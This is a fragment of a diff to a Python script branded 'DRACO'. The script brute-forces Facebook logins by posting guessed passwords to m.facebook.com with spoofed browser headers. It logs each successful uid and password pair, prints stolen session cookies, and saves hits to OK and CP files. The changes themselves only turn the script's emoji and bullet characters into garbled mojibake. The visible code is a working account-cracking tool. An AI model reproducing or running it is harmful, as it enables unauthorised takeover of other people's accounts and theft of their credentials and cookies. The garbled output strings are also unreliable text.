-                print(f'\r\033[0;95m[DRACO-Cp🌺]✅Uid┏━➤ {idf} 🔑Pass┏━➤{pw}')
+                print(f'\r\033[0;95m[DRACO-CpðŸŒº]âœ…Uidâ”â”âž¤ {idf} ðŸ”‘Passâ”â”âž¤{pw}')
                 os.system('espeak -a 300 " Sorry,  You,  Have,  Got,  Cp,  Id"')
-                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
-                akun.append(idf+' • '+pw)
+                open('CP/'+cpc,'a').write(idf+' â€¢ '+pw+'\n')
+                akun.append(idf+' â€¢ '+pw)
                 cp+=1
                 break
             elif "c_user" in ses.cookies.get_dict().keys():
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[0;96m[DRACO-Ok🌸] ✅Uid┏━➤ {idf} 🔑Pass┏━➤ {pw}\n\033[0;91m[🌼]= COOKIES • \033[0;91m{kuki} ')
+                print(f'\r\033[0;96m[DRACO-OkðŸŒ¸] âœ…Uidâ”â”âž¤ {idf} ðŸ”‘Passâ”â”âž¤ {pw}\n\033[0;91m[ðŸŒ¼]= COOKIES â€¢ \033[0;91m{kuki} ')
                 os.system('espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
-                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
+                open('OK/'+okc,'a').write(idf+' â€¢ '+pw+'\n')
                 break
                 
             else:
@@ -2222,7 +2222,7 @@ def crack(idf,pwv):
  
 def crackfree(idf,pwv):
     global loop,ok,cp
-    sys.stdout.write(f"\r{H}[DRACO 🔍-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+    sys.stdout.write(f"\r{H}[DRACO ðŸ”-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}â€¢{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -2239,19 +2239,19 @@ def crackfree(idf,pwv):
             heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•DRACO-Cp] ✅Uid┏━➤ {idf} 🔑Pass┏━➤')
+                print(f'\r\033[0;95m[{time.strftime("%H:%M")}â€¢DRACO-Cp] âœ…Uidâ”â”âž¤ {idf} ðŸ”‘Passâ”â”âž¤')
                 os.system('espeak -a 300 " Sorry,  You,  Have,  Got,  Cp,  Id"')
-                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
-                akun.append(idf+' • '+pw)
+                open('CP/'+cpc,'a').write(idf+' â€¢ '+pw+'\n')
+                akun.append(idf+' â€¢ '+pw)
                 cp+=1
                 break
             elif "c_user" in ses.cookies.get_dict().keys():
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•DRACO-Ok] ✅Uid┏━➤ {idf} 🔑Pass┏━➤')
+                print(f'\r\033[10;92m[{time.strftime("%H:%M")}â€¢DRACO-Ok] âœ…Uidâ”â”âž¤ {idf} ðŸ”‘Passâ”â”âž¤')
                 os.system('espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
-                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
+                open('OK/'+okc,'a').write(idf+' â€¢ '+pw+'\n')
                 break
                 
             else:
